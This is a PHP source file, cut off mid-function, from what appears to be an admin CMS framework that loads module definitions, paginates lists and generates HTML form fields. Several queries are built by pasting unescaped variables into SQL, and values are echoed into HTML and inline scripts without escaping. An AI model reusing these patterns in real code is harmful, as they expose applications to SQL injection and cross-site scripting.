<?
$TxtcolTypes=array();
$TxtcolTypes[0]=array('text',k_txt);$TxtcolTypes[1]=array('number',k_num);$TxtcolTypes[2]=array('email',k_email);$TxtcolTypes[3]=array('tel',k_phone);$TxtcolTypes[4]=array('date',k_date);$TxtcolTypes[5]=array('color',k_color);$TxtcolTypes[6]=array('range',k_range);$TxtcolTypes[7]=array('month',k_month);$TxtcolTypes[8]=array('week',k_week);$TxtcolTypes[9]=array('time',k_tim);$TxtcolTypes[10]=array('datetime',k_date_time);$TxtcolTypes[11]=array('search',k_search);$TxtcolTypes[12]=array('url',k_link);

function modCode($mod){
	global $MFF;
	if($MFF){
		$code=MF_getModCode($mod,1);
	}else{
		$code=get_val_c('_modules','code',$mod,'module');
	}
	return $code;
}
function loadModulData($M){
	global $PER_ID,$lg,$MFF;
	$ch=checkPer($PER_ID);
	$mod_data=array();
	if($MFF){
		$code=$M;
		$code=MF_getModCode($M,1);
		if(!$code){$code=$M;}
		$data=MF_mod_data($code);
		$act=$data['mod']['act'];
		
		if($act){
			$mod_data['c']=$code;
			$mod_data[0]=$data['mod']['id'];
			$mod_data[1]=$data['mod']['table'];
			$mod_data[2]=$data['mod']['title_'.$lg];
			$mod_data[3]=$data['mod']['order'];
			$mod_data[4]=$data['mod']['order_dir'];
			$mod_data[5]=$data['mod']['rpp'];
			$mod_data[6]=$data['mod']['opr_type'];
			$mod_data[7]=$ch[1];
            $mod_data[77]=$data['mod']['opr_copy'];
			$mod_data[8]=$data['mod']['add_page'];
			$mod_data[9]=$ch[2];
			$mod_data[10]=$data['mod']['edit_page'];
			$mod_data[11]=$ch[3];
			$mod_data[12]=$data['mod']['opr_order'];
			$mod_data[13]=$ch[4];
			$mod_data[14]=$data['mod']['opr_show_id'];
			$mod_data[15]=$data['mod']['opr_export'];
			$mod_data[16]=$data['mod']['ids_set'];
			$mod_data[17]=$data['mod']['events'];
			$mod_data['sort_no']=modColumnNo($mod_data['c'],$mod_data[3]);
			return $mod_data;
		}
		
	}else{
		$sql="select * from _modules where (module='$M' OR code='$M') and act=1";
		$res=mysql_q($sql);
		$rows=mysql_n($res);
		if($rows>0){
			$r=mysql_f($res);
			$mod_data['c']=$r['code'];
			$mod_data[0]=$r['id'];
			$mod_data[1]=$r['table'];
			$mod_data[2]=$r['title_'.$lg];
			$mod_data[3]=$r['order'];
			$mod_data[4]=$r['order_dir'];
			$mod_data[5]=$r['rpp'];
			$mod_data[6]=$r['opr_type'];
			$mod_data[7]=$ch[1];
            $mod_data[77]=$r['opr_copy'];
			$mod_data[8]=$r['add_page'];
			$mod_data[9]=$ch[2];
			$mod_data[10]=$r['edit_page'];
			$mod_data[11]=$ch[3];
			$mod_data[12]=$r['opr_order'];
			$mod_data[13]=$ch[4];
			$mod_data[14]=$r['opr_show_id'];
			$mod_data[15]=$r['opr_export'];
			$mod_data[16]=$r['ids_set'];
			$mod_data[17]=$r['events'];
			$mod_data['sort_no']=modColumnNo($mod_data['c'],$mod_data[3]);
			return $mod_data;
		}
	}
}
function modColumnNo($mod,$colum){
	global $MFF;
	$out=0;
	if($MFF){
		$data=MF_mod_data($mod);		
		foreach($data['items'] as $k=>$v){
            if($v['colum']==$colum){
                if($v['act']){
                    $out=$v['id'];
                }
            }
        } 
	}else{		
		$out=get_val_con('_modules_items','id',"mod_code='$mod' and colum='$colum' and act=1");
	}
	return $out;
}
function getColumesData($mod,$getById=0,$s_id=0,$Qq='act=1'){
	$out=array();
	$exQ='';
    global $MFF;
    if($MFF){
        $data=MF_mod_data($mod);		
		foreach($data['items'] as $k=>$v){
            //if($v['colum']==$colum){
                if($v['act']){
                    $out=$v['id'];
                }
            //}
        } 
    }else{
        if($s_id){
            $sql="select * from _modules_items where $Qq AND code='$s_id' order by ord ASC";
        }else{
            $exCols=get_val_con('_ex_col','cols'," mod_code='$mod'");
            if($exCols){$exQ=" and code NOT IN('".str_replace(',',"','",$exCols)."')";}
            $sql="select * from _modules_items where mod_code='$mod' $exQ and $Qq  order by ord ASC";
        }
        $res=mysql_q($sql);
        $rows=mysql_n($res);
        if($rows>0){
            $i=0;
            while($r=mysql_f($res)){
                $index=$i;
                if($getById){
                    $this_id=$r['code'];
                    $index=$this_id;
                }
                $out[$index]['m']=$r['mod_code'];
                $out[$index]['c']=$r['code'];
                $out[$index]['act']=$r['act'];
                $out[$index][0]=$r['id'];			
                $out[$index][1]=$r['colum'];
                $out[$index][2]=$r['title'];
                $out[$index][3]=$r['type'];
                $out[$index][4]=$r['validit'];
                $out[$index][5]=$r['prams'];
                $out[$index][6]=$r['show'];
                $out[$index][7]=$r['requerd'];
                $out[$index][8]=$r['defult'];
                $out[$index][9]=$r['lang'];
                $out[$index][10]=$r['note'];
                $out[$index][11]=$r['filter'];
                $out[$index][12]=$r['link'];			
                $i++;
            }
        }
    }
	return $out;
}
function pagination($table,$cond,$rpp,$all_rows='x'){
	if($rpp==0)$rpp=10;
	$out=array('','','');
	$p=pp($_POST['p']);
	if($all_rows=='x'){$all_rows=getTotalCO($table,$cond);}
	if($all_rows%$rpp==0){$pn=$all_rows/$rpp;}else{$pn=intval(($all_rows/$rpp))+1;}
	if($p >= $pn && $p!=0){$p=($pn-1);}
	if(!is_numeric ($p) || $p<0){$p=0;}
	$out[1]=" limit ".($p*$rpp).",".$rpp;
	$out[0]=co_pagging($all_rows,$rpp,$p);
	$out[2]=$all_rows;
	return $out;
}
function co_pagging($t,$rpp,$p){
	$more_pages=0;
	$str='';
	$mvp=10;//Max View Page
	if($t>$rpp){
		$str='<div class="pagging fl">';
		if($t%$rpp==0){
			$pages=$t/$rpp;
		}else{
			$pages=intval(($t/$rpp))+1;
		}
		$s_loop=0;
		$e_loop=$pages;
		if($mvp<$pages){
			$more_pages=1;
			$m_mvp=intval($mvp/2);
			if($p<=$m_mvp){
				$s_loop=0;
				$e_loop=$mvp;
			}else if($p>=($pages-$m_mvp)){
				$s_loop=$pages-$mvp;
				$e_loop=$pages;
				$more_pages=0;
			}else{
				$s_loop=$p-$m_mvp;
				$e_loop=$s_loop+$mvp;
			}			
		}
		if($p!=0){$str.='<div class="p_butt fl" pn="'.($p-1).'" title="'.k_priv.'" >&#8249;</div>';}
		for($i=$s_loop;$i<$e_loop;$i++){
			if($p==$i){
				$str.= '<div class="p_act fl">'.($i+1).'</div>';
			}else{
				$str.= '<div class="p_no fl"pn="'.$i.'">'.($i+1).'</div>';
			}
		}
		if($more_pages){			
			if($e_loop!=$pages){
				$str.='<div class="p_no fl" pn="'.($pages-1).'"> * '.$pages.'</div>';
			}			
		}
		if($p<$pages-1){$str.='<div class="p_butt fl" pn="'.($p+1).'" title="'.k_next.'">&#8250;</div>';}
		
		$str.='<div class="selPm fl">			
			<div class="fr" id="sPnE" title="'.k_send.'" ></div>
			<div class="fr" ><input type="number" id="sPnI"/></div>
			</div>'; 
		$str.='</div>';
	}
	return $str;
}
function co_list($cData,$val,$id,$Mood=0){
	global $lg,$m_path,$table,$mod_data,$chPer;	
	$cCode=$cData['c'];
	$cId=$cData[0];
	$type=$cData[3];
	$par=$cData[5];
	$name=$cData[1];
	$multi=$cData[8];
	$res="";
	$limitTxt=100;
	if($Mood){$limitTxt=5000;}
	switch ($type) {
		case 1:
			if($val!=""){
				if(in_array($par,array(2,3,4,7,9))){
					$res='<ff dir="ltr">'.limitString(get_key($val),$limitTxt).'</ff>';				
				}else if($par==1){				
					$res='<ff dir="ltr">'.numFor($val,3).'</ff>';				
				}else if($par==5){
					$res='<div style="background-color:'.$val.'" class="colorLbox" dir="ltr">'.$val.'</div>';
				}else{
					$res='<div class="f1">'.splitNo(limitString(get_key($val),$limitTxt)).'</div>';
				}
			}else{
				$res="&nbsp;";
			}
			//$res=$par;
		break;
		case 2:
			if($par==0){$dd=$val;}
			if($par==1){if($val>0){$dd=dateToTimeS3($val,1);}else{$dd='-';}}
			if($par==2 || $par==3){if($val>0){$dd=dateToTimeS3($val);}else{$dd='-';}}
			$res='<div class="fl_d">'.$dd.'</div>';
		break;
		case 3:
			$pars=explode('|',$par);
			if($par[0]==1 && $chPer[2]){
				$res=makeSwitch($cCode,$id,$val,$pars[1],$Mood);
			}else{
				$res='<div class="act_'.$val.' c_cont"></div>';
			}
		break;
		case 4:
			if($val){$res=viewPhotosImg($val,1,5,50,50);}else{$res='&nbsp;';}
		break;
		case 5:			
			$pars=json_decode($par,true);
			$p_table=$pars['table'] ?? '';
			$p_col=$pars['col'] ?? '';
			$p_view=$pars['view'] ?? '';
			$p_c_view=$pars['c_view'] ?? '';
			$p_mod_link=$pars['mod_link'] ?? '';
			$p_cond=$pars['cond'] ?? '';
			$p_evns=$pars['evns'] ?? '';
			if($multi==1){
				$text='';
				if($val!=''){					
					$tVal=str_replace(',',"','",$val);
					$sql="select * from ".$p_table." where `$p_col` IN ('$tVal')"; 
					$res=mysql_q($sql);
					$rows=mysql_n($res);
					if($rows>0){
						while($r=mysql_f($res)){							
							$text.=$r[convLangCol($p_view)].' / ';
						}
					}
					$text=substr($text,0,-3);
					$text2=limitString($text,150);
					$res='<span title="'.$text.'">'.$text2.'</span>';
				}
			}else{
				if($p_c_view){
					$c_view=$p_c_view;
					$availableCols=availableCols($p_c_view);
					if(count($availableCols)){						
						$colsVals=get_val_arr($p_table,convLangCol(implode(',',$availableCols)),$val,'a_'.$cId,$p_col);							
						if(is_array($colsVals)){							
							foreach($availableCols as $k=>$col){
								$c_view=str_replace('['.$col.']',$colsVals[$k],$c_view);
							}
						}
					}
					$res=$c_view;
				}else{
					if($p_table){
                		$res=limitString(get_val_arr($p_table,convLangCol($p_view),$val,'a_'.$cId,$p_col),$limitTxt);
					}
				}
			}
		break;
		case 6:
			$pars=explode('|',$par);
			for($i=0;$i<count($pars);$i++){
				$pars2=explode(':',$pars[$i]);
				if($val==$pars2[0]){
					$res=limitString(get_key($pars2[1]),$limitTxt);
				}
			}
		break;
		case 7:
			if($val!=""){$res=nl2br(limitString($val,$limitTxt));}else{$res="&nbsp;";}
		break;
		case 8:			
			if($val){$res=viewFile($val,0,5);}else{$res='&nbsp;';}
		break;
		case 9:
			if($val!=""){$res=lang_name($val);}else{$res="&nbsp;";}
		break;
		case 10:
			if($name!=''){
				$link='';
				$pars=explode('|',$par);
				$linkMode=1;
				if(substr($pars[0],0,3)=='js:'){
					$link=substr($pars[0],3);
					$linkMode=0;
				}else{
					if($pars[0]){
					$link=_path.$lg.'/'.$pars[0];
					}
				}
				$link=str_replace('[id]',$id,$link);
				if($pars[1] && $pars[2]){
					$t=getTotal($pars[1],$pars[2],$id);
				}
				$s='t';
				if($t==0){$s='n';}
				$res='';
				if($linkMode==1){
					if($link){$res.='<a href="'.$link.'" class="ex_link">';}
					$res.='<div class="child_link fl"><div '.$s.'>'.$t.'</div>'.get_key($name).'</div>';
					if($link){$res.='</a>';}
				}else{
					$res.='<div class="child_link fl" onclick="'.$link.'"><div '.$s.'>'.$t.'</div>'.get_key($name).'</div></a>';
				}
			}
		break;
		case 11:
			if($val!=""){
				if($par==1){
					$res=get_val('_users','name_'.$lg,$val);
				}else{
					$res=limitString($val,$limitTxt);
				}
			}else{$res="&nbsp;";}
		break;
		case 14:
			$res=getCustomFiledIN_m('list',$par,$id,$val);
		break;
        case 16:
			$res='<div class="fl ic30 ic30_info ic30Txt icc3" tpView="'.$id.'" cn="'.$cId.'">'.k_view_record.'</div>';
		break;
	}
	return $res;
}
function co_header_sec($module){
	global $m_path,$mod_data,$thisUser,$def_title;	
	$out='	
	<header>
	<div class="top_txt_sec fl">
		<div class="top_title fl f1" >'.$def_title.' <span id="m_total"></span></div>	
	</div>
	<div class="top_icons fr" type="list">';
	$filters=getTotalCO('_modules_items'," mod_code='".$mod_data['c']."' and filter!=0");
	if($filters>0){
		$out.='<div class="top_icon ti_search fr" onclick="Open_co_filter(0)" tilte="'.k_search.'"></div>';		
	}
	if($mod_data[7]){
		if($mod_data[8]){
			$mod_data[8]=str_replace('[user]',$thisUser,$mod_data[8]);
			$out.='<div class="top_icon ti_add fr" onclick="'.$mod_data[8].'" title="'.k_add.'"></div>';
		}else{
			$out.='<div class="top_icon ti_add fr" onclick="co_loadForm(0,'.$mod_data[6].',0)" title="'.k_add.'"></div>';			
		}
	}
	if($mod_data[15]){
		$out.='<div class="top_icon ti_res fr" onclick="ExportModuleData()" title="'.k_export.'"></div>';	
	}
	$out.='<div class="top_icon ti_ref fr" onclick="loadModule(\''.$module.'\')" title="'.k_refresh.'"></div>';
	if($mod_data[11]){
		$MdelActin ="co_del_sel()";
		if($mod_data[17]){$MdelActin ="co_del_sel_e()";}
		$out.='<div class="top_icon ti_del fr hide" onclick="'.$MdelActin.'" title="'.k_delete.'"></div>';
	}
	$out.='</div>
	
	<div class="top_icons fr hide" type="opr" >';
	$out.='<div class="top_icon ti_save fr" onclick="sub(\'co_form0\')" title="'.k_save.'"></div>';
	$out.='<div class="top_icon ti_ref fr" onclick="ref_form()" title="'.k_refresh.'"></div>';
	$out.='<div class="top_icon ti_back fr" onclick="switchHeader(\'list\');loadModule()" title="'.k_back.'"></div>';
	$out.='</div></header>';
	return $out;
}
function co_getFormInput($id,$data,$value='',$sub=0,$justFiled=0,$oprType=''){
	global $lg_s,$lg_n,$lg_s_f,$lg_n_f,$sptf_rr,$lg,$TxtcolTypes,$lg_dir,$_defImgTyp,$_img_multi,$_img_width,$_img_height;
	$reqt='';
	$fils=array();
	$fils_values=array();
	$res='';
	if($data[9]){
		if($data[3]==14){
			array_push($fils,'cof_'.$data['c']);
			if(is_array($value)){
				array_push($fils_values,$value[$lg]);
			}else{$value='';}
		}else{
			foreach($lg_s as $ls){
				array_push($fils,'cof_'.$data['c'].'_'.$ls);
				if(is_array($value)){
					array_push($fils_values,$value[$ls]);
				}else{$value='';}
			}
		}	
	}else{
		array_push($fils,'cof_'.$data['c']);
		array_push($fils_values,$value);
	}	
	for($f=0;$f<count($fils);$f++){
		$value=$fils_values[$f];
		if($data[3]!=10 && $data[3]!=11 && $data[3]!=15 && (!($data[3]==2 && $data[5]>1))){
			if($data[7]){$reqt=' required '; $star='<span>*</span>';}
			if($justFiled==0){
				$res.='<tr><td n>'.get_key($data[2]).': ';
				if($data[9]){if($data[3]!=14 && count($lg_n)>1){
					$res.=' </br><b>( '.$lg_n[$f].' )</b>';}}
                    $trDir='';    
                    if($data[3]!=16 && $data[3]!=4 && $data[3]!=8){$trDir=$lg_dir[substr($fils[$f],-2)];}
				    $res.=$star.'</td><td i dir="'.$trDir.'">';
			}
			if($value=='' && $data[3]!=5 && $data[3]!=6){$value=get_key($data[8]);}
			switch($data[3]){
				case 1:
				$pars=explode('|',$data[5]);$tt=$pars[0];
				if(!$tt[0]){$tt=0;}
				$txtType=$TxtcolTypes[$tt][0];
				$class='';
				if($tt==9){$class=' class="DUR" ';}
				$res.='<input name="'.$fils[$f].'" '.$class.' value="'.$value.'" type="'.$txtType.'"  '.$reqt.' >';break;		
				case 2:				
				$dateType=$data[5];
				if($id){
					if($value!=''){
						if($dateType>0){$value=dateToTimeS3($value,1);}
					}
				}else{
					if($data[7]){
						if(!$value){$value=date('Y-m-d');}
					}
				}
				$res.='<input name="'.$fils[$f].'"  value="'.$value.'" type="text" class="Date" '.$reqt.'>';break;
				case 3:
					$pars=explode('|',$data[5]);
					$tt=$pars[1];$ch='';
					if($tt==2 && $value==1){
						$res.='<input name="'.$fils[$f].'" value="1" type="hidden" /><div class="f1 lh40 ">'.k_no_edit.'</div>';
					}else{
						if($value==''){$value=$data[8];}					
						if($value==1){$ch=" checked ";}				
						$res.='<input name="'.$fils[$f].'" value="1" type="checkbox" '.$ch.'><div class="cb"></div>';
					}
				break;		
				case 4:
                    //$res.=imageUp($fils[$f],$value,1);                    
                    $pars=explode('|',$data[5]);                    
                    $fEx=implode(',',$_defImgTyp);
                    $m=$_img_multi;//multi files upload
                    if(count($pars)==4){
                        if($pars[1]){$fEx=$pars[1];}
                        if($pars[0]!=''){$m=intval($pars[0]);}                        
                    }
                    $res.=imageUpN($id,$fils[$f],$data['c'],$value,$data[7],$m,'',$fEx);
                break;		
				case 5:$res.=make_list_form($data,$value,$sub,$data[12]);break;		
				case 6:$res.=make_list_form($data,$value,$sub,$data[12]);break;		
				case 7:$res.='<textarea class="so w100" name="'.$fils[$f].'"  '.$reqt.'  >'.stripslashes($value).'</textarea>';break;
				case 8:$res.=upFile($fils[$f],$value,1,'',$data[7]);break;	
				
				case 9:$res.=make_list_form($data,$value);break;
				case 12:
                    if($value!=''){$value="******";}                    
				    $res.='<input name="'.$fils[$f].'" value="'.$value.'" type="password" class="text_f" '.$reqt.' passCheck="'.$data[5].'">';
                    if($data[5]){
                        $res.='<span style="color:#f00">يجب انا تكون كلمة السر مؤلفة من 8 أحرف على الأقل وتحتوي على احرف صغيرة وكبير وأرقام ورموز مثال(AbCabc123#@$)</span>';
                    }
                break;		
				case 13:$res.='<textarea name="'.$fils[$f].'" '.$reqt.' class="cof_m_editor">'.stripslashes($value).'</textarea>';break;
				case 14:$opr='add';                    
                    if($id || $oprType!=11){$opr='edit';}
                    $res.=getCustomFiledIN_m($opr,$data[5],$id,stripslashes($value),$fils[$f]);
                break;
                case 16:
                    if($value[0]!='['){$value='';}
                    $txtSize=getFileSize(strlen($value)*8);
                    $value=str_replace('\n\n','\n',htmlspecialchars($value));
                    $res.='<div class="editEidtor"  tpCode="'.$fils[$f].'" title="'.k_edit.'">
                        <div class="f1 fs114">'.k_size.': <ff14 sz>'.$txtSize.'</ff14></div>
                    </div>
                    <input name="'.$fils[$f].'" value="'.$value.'" type="hidden" '.$reqt.' >';break;
			}
			if(_F_notes==1 && $data[10]!=''){$res.='<div><span>'.get_key($data[10]).'</span></div>';}
			if($justFiled==0){$res.='</td></tr>';}		
		}else{
			if($data[3]==11){
				$s_val=getStaticVal($data[5]);
				$res.='<input type="hidden" name="cof_'.$data['c'].'" value="'.$s_val.'" type="text" >';		
			}
		}
	}
	return $res;
 }

function co_getFormInput_link($id,$value,$sub,$deVal){
	global $lg_s,$lg_n,$lg_s_f,$lg_n_f,$sptf_rr,$lg;
	$sub=intval($sub);
	$mod_code=get_val_c('_modules_items','mod_code',$id,'code');	
	$cData=getColumesData($mod_code,1);
	$data=$cData[$id];
	$l=explode('^',$data[12]);
	$oprC=count($l);
	$res='';
	if($oprC==1){
		$ll=explode('|',$l[0]);
		if($value==0){
			$reqt='';
			if($data[7]){$reqt='required';}
			$res.='<input type="text" disabled '.$reqt.' name="cof_'.$data[0].'" id="ri_cof_'.$data[0].'">';
		}else{
			$res.=make_list_form($data,$deVal,$sub,'col:'.$ll[2].':'.$value);
		}
	}else{
		$ll=explode('|',$l[0]);
		$lp=explode('|',$l[1]);
		$loadSunId=$lp[1];		
		if($value==0){
			$res.=$ll.'<input type="hidden" name="cof_'.$data[0].'" id="ri_cof_'.$data[0].'">';
		}else{
			$res.=make_list_form($data,$deVal,$sub,'colP:'.$ll[2].':'.$value.':'.$l[1]);
		}
		$res.='<script>loadSuns(",'.$loadSunId.'")</script>';		
	}
	if(_F_notes==1 && $data[10]!=''){$res.='<br><span>'.get_key($data[10]).'</span>';}	
	return $res;
}
function co_getFormInput_val($data,$val,$v=''){
	if($data[3]==6){
		$x1=explode('|',$data[5]);
		foreach($x1 as $d){
			$x2=explode(':',$d);
			if($x2[0]==$v){$value=get_key($x2[1]);}
		}
	}
	if($data[3]==5){		
		$parsObj=json_decode($data[5],true);		
		$p_table=$parsObj['table'] ?? '';
		$p_col=$parsObj['col'] ?? '';
		$p_view=$parsObj['view'] ?? '';
		$p_c_view=$parsObj['c_view'] ?? '';
		$p_mod_link=$parsObj['mod_link'] ?? '';
		$p_cond=$parsObj['cond'] ?? '';
		$evens=$parsObj['evens'] ?? '';

		$value=get_val($p_table,convLangCol($p_view),$val);
	}
	if($data[3]==1){
		$value=$val;
		if(in_array($data[5],array(1,2,3,4))){
			$value='<ff>'.$val.'</ff>';
		}		
	}
	if(in_array($data[3],array(1,7))){$value=$val;}	
	$link=$data[12];	
	$linkType_P=0;
	$linkType_S=0;
	$linkType_P_per='';
	$linkType_P_per2='';
	$linkType_S_per='';
	$linkType_S_per2='';
	$p_link='';
	$s_link='';
	$rebackSelect=0;
	if($link!=''){	
		$ll=explode(':',$link);
		if($ll[0]=='col'){
			$rebackSelect=1;
		}else{
			$l1=explode('^',$link);
			$oprC=count($l1);
			if($oprC==1){
				$lll=explode('|',$l1[0]);
				if($lll[0]==1){
					$linkType_P=1;
					$linkType_P_per=$lll[1];
					$linkType_P_per2=$lll[2];					
					$Multi='';
				}
				if($lll[0]==2){
					$linkType_S=1;
					$linkType_S_per=$lll[1];
					$linkType_S_per2=$lll[3];										
				}
			}else{
				$lll=explode('|',$l1[0]);
				$linkType_S=1;
				$linkType_S_per=$lll[1];
				$linkType_S_per2=$lll[3];				
				$lll=explode('|',$l1[1]);
				$linkType_P=1;
				$linkType_P_per=$lll[1];				
			}
		}
	}
	if($linkType_P){
		$p_link='p_link="'.$linkType_P_per.'"';				
		if($linkType_S==0){
			echo '<script>parent_loader+=",'.$linkType_P_per.'";</script>';
		}
	}
	if($linkType_S){
		$s_link='s_link="'.$linkType_S_per2.'" deVal="'.$value.'"';
		if($linkType_P==0){
			$echo= '<script>parent_loader+=",'.$linkType_S_per.'";</script>';
		}
	}
	$ret='<div '.$s_link.'>';
	$res='';
	if($value!=''){
		$ret.='';
		$res.='<tr><td n>'.get_key($data[2]).': <span>*</span></td><td i class="f1 fs14">'.splitNo($value).'
		<input type="hidden" name="cof_'.$data[0].'" '.$p_link.' id="cof_'.$data[0].'" value="'.$v.'" ></td></tr>';
	}
	return $res;
}
function make_list_form($data,$value='',$sub=0,$link=''){
	global $lg_s,$lg_n,$thisUser;
	$req=$data[7];
	$ret="";
	$rows=0;
	$mod='';
	$evn='';
	$Multi=$data[8];
	$data_rows=array();
	$Q='';
	if($link!=''){
		$ll=explode(':',$link);
		if($ll[0]=='col'){
			$colFilter=$ll[1];
			$colFilter_val=$ll[2];
			$Q=" where `$colFilter`='$colFilter_val' ";
		}
		if($ll[0]=='colP'){
			$colFilter=$ll[1];
			$colFilter_val=$ll[2];
			$Q=" where `$colFilter`='$colFilter_val' ";
			$link=$ll[3].'|sun';
		}
	}
	if($data[3]==5){
		$pars=explode('|',$data[5]);
		$parsObj=json_decode($data[5],true);		
		$p_table=$parsObj['table'] ?? '';
		$p_col=$parsObj['col'] ?? '';
		$p_view=$parsObj['view'] ?? '';
		$p_c_view=$parsObj['c_view'] ?? '';
		$p_mod_link=$parsObj['mod_link'] ?? '';
		$p_cond=$parsObj['cond'] ?? '';
		$evens=$parsObj['evens'] ?? '';

		$Multi=$data[8];
		$table=$p_table;
		$val=$p_col;
		$name=convLangCol($p_view);
		$mod=$p_mod_link;
		$cond=readVarsInText($p_cond);
		$evn=$evens;
		if($cond){
			if($Q){$Q.=" AND ";}else{$Q.=" WHERE ";}	
			$Q.=$cond;
		}		
		
		$recs=getTotalCO($table,$Q);
		$limitQ=_listMinSer+2000;
		if($recs>$limitQ && $Multi==0){
			if($value){				
				$Q=cekActColun($table,$Q);
				if($Q){$Q.=" AND ";}else{$Q.=" WHERE ";}
				$Q.=" $val = '$value' ";				
				$sql="select $val,$name from $table $Q limit 1";
				$res=mysql_q($sql);
				$rows=mysql_n($res);		
				if($rows>0){
					$r=mysql_f($res);
					$thisVal=$r[$val];
					$thisName=$r[$name];
					for($i=0;$i<=$limitQ;$i++){$data_rows[$i]=array('val'=>$thisVal,'name'=>$thisName);}
				}else{
					$value='';
					//for($i=0;$i<=$limitQ;$i++){$data_rows[$i]=array('val'=>$thisVal,'name'=>$thisName);}
				}				
			}
			if(!$value){				
				$Q=cekActColun($table,$Q);	
				$sql="select $val,$name from $table $Q order by $name ASC limit 1";
				$res=mysql_q($sql);
				$rows=mysql_n($res);		
				if($rows>0){
					$r=mysql_f($res);
					$thisVal=$r[$val];
					$thisName=$r[$name];
					for($i=0;$i<=$limitQ;$i++){$data_rows[$i]=array('val'=>0,'name'=>'');}
				}				
			}
		}else{
			$Q.=cekActColun($table,$Q);
			$Q=str_replace('[user]',$thisUser,$Q);
			$Q=readVarsInText($Q);
			$limitTxt='';
			if($Multi==0 && $value==''){$limitTxt="limit ".($limitQ+1);}
			$sql="select $val,$name from $table $Q order by $name ASC ".$limitTxt;
			
			$res=mysql_q($sql);
			$rows=mysql_n($res);
			$i=0;
            //echo $r[$name];
            $colmArr=explode(',',$name);
			while($r=mysql_f($res)){
                $txt='';
                foreach($colmArr as $c){
                   if($txt!=''){$txt.=' - ';}
                    $txt.=$r[$c];
                }
				$data_rows[$i]=array('val'=>$r[$val],'name'=>$txt);
				$i++;
			}
		}
	}
	if($data[3]==6){
		if($data[5]!=''){
			$vals=explode('|',$data[5]);			
			$rows=count($vals);
			for($v=0;$v<$rows;$v++){
				$vv=explode(':',$vals[$v]);
				$data_rows[$v]=array('val'=>$vv[0],'name'=>get_key($vv[1])); 
			}
		}
	}
	if($data[3]==9){
		$req=1;
		$Multi='';
		$rows=count($lg_s);
		for($v=0;$v<$rows;$v++){
			$data_rows[$v]=array('val'=>$lg_s[$v],'name'=>$lg_n[$v]); 
		}
	}
	//if($rows>0){
	$ret=selelectOrradio($mod,'cof_'.$data['c'],$data_rows,$value,$req,$sub,'',$Multi,$link,$evn);		
	//}
	return $ret;
}
function cekActColun($table,$Q){
	if($table){
		$res= mysql_q("SHOW COLUMNS FROM `$table` LIKE 'act'");
		if(strpos($Q,' act')==false){
			if(mysql_n($res)){
				if($Q){$Q=" AND ";}else{$Q=" WHERE ";}
				return $Q." act=1";
			}
		}
	}else{
		return $Q;
	}
}
function selelectOrradio($mod,$filed,$data_rows,$value='',$req=0,$sub=0,$col='',$Multi='',$link='',$evn=''){
	$reqt='';    
	$rows=count($data_rows);
	if($mod && $mod!='set'){
		$mod3=getModNow($mod);
		$chPer3=checkPer($mod3);
		if($chPer3[1] || $chPer3[2]){
			$linkIn='';
			$for_type_li=1;
			$filed_add_mod=$filed;
			$listDefValue=0;		
			if($link!=''){
				$ll=explode(':',$link);
				if($ll[0]=='col'){
					$linkIn=$link;
					$for_type_li=4;
					$filed_add_mod=$filed.'|'.$ll[1].':'.$ll[2].':h';
					$filed_add_mod_v=','.$ll[1].':'.$ll[2].':h';
					$filed_add_mod_v2=$ll[1].'|'.$ll[2];
				}
				if($ll[0]=='colP'){
					$linkIn=$link;
					$for_type_li=4;
					$filed_add_mod=$filed.'|'.$ll[1].':'.$ll[2].':h';
					$filed_add_mod_v=','.$ll[1].':'.$ll[2].':h';
					$filed_add_mod_v2=$ll[1].'|'.$ll[2];
					$link=$ll[3].'|sun';
				}
			}			
			if($rows>_listMinSer && $mod!='set'){
				if($Multi==''){
				$addBut='
					<div class="fl ser_but" onclick="co_selbigVal(\''.substr($filed,4).'\',0,\''.$filed_add_mod_v2.'\')"></div>';			
					$addMargin="slidSelect";
				}
			}else{				
				$addBut='
				<script>mod_data["'.$filed.'"]=["'.$mod.'",'.($sub+1).',"'.$col.'"]</script>			
				<div class="fl add_but"  onclick="co_loadForm(0,'.$for_type_li.',\''.($filed_add_mod).'\',\''.$evn.'\')"></div>';			
				$addMargin="slidSelect";
			}
		}
	}	
	$linkType_P=0;
	$linkType_S=0;
	$linkType_P_per='';
	$linkType_P_per2='';
	$linkType_S_per='';
	$linkType_S_per2='';	

	$p_link='';
	$s_link='';
	$rebackSelect=0;
	if($link!=''){	
		$ll=explode(':',$link);
		if($ll[0]=='col'){
			$rebackSelect=1;
		}else{
			$l1=explode('^',$link);
			$oprC=count($l1);
			if($oprC==1){
				$lll=explode('|',$l1[0]);
				if($lll[0]==1){
					$linkType_P=1;
					$linkType_P_per=$lll[1];
					$linkType_P_per2=$lll[2];					
					$Multi='';
				}
				if($lll[0]==2){
					$linkType_S=1;
					$linkType_S_per=$lll[1];
					$linkType_S_per2=$lll[3];										
				}
			}else{
				$lll=explode('|',$l1[0]);
				$linkType_S=1;
				$linkType_S_per=$lll[1];
				$linkType_S_per2=$lll[3];
				
				$lll=explode('|',$l1[1]);
				$linkType_P=1;
				$linkType_P_per=$lll[1];				
			}
		}
	}
	$ret='';
	if(($rows>_listMin && $Multi=='') || $linkType_P || $linkType_S){
		if($rebackSelect==0){
			if($linkType_P){
				$p_link='p_link="'.$linkType_P_per.'"';				
				if($linkType_S==0){
					echo '<script>parent_loader+=",'.$linkType_P_per.'";</script>';
				}
			}
			if($linkType_S){
				$s_link='s_link="'.$linkType_S_per2.'" deVal="'.$value.'"';
				if($linkType_P==0){
					$echo= '<script>parent_loader+=",'.$linkType_S_per.'";</script>';
				}
			}
			$ret.='<div '.$s_link.'>';
		}
		if($link=='' || $linkType_P || $rebackSelect==1){
			$reqt='';
			if($req==1){$reqt=' required ';}
			$this_name='';
			if($rows>_listMinSer && $mod!='set'){
				if($rows>0){
					foreach($data_rows as $d){if($value==$d['val']){$this_name=$d['name'];}}
				}
				if($req==1 && !$value){
					//$value=$data_rows[0]['val'];	
					//$this_name=$data_rows[0]['name'];					 
				}
				if($this_name==''){$this_name=k_ndef_val;}
				$ret.='<input type="hidden" name="'.$filed.'" '.$p_link.' id="'.$filed.'" value="'.$value.'" '.$reqt.' >';		
				$ret.=$addBut.'<div class=" bigselText" '.$p_link.' id="coft_'.substr($filed,4).'"';
				//if($mod){
					$ret.=' onclick="co_selbigVal(\''.substr($filed,4).'\',0,\''.$filed_add_mod_v2.'\')"';
				//}
				$ret.='>'.get_key($this_name).'</div>';
			}else{				
				$SelAction="";
				if($evn){$SelAction='onChange="CLE_m(\''.$evn.'\',\''.str_replace('cof_','',$filed).'\',this.value)"';}
				$ret.=$addBut.'<div class="'.$addMargin.'" '.$p_link.' >
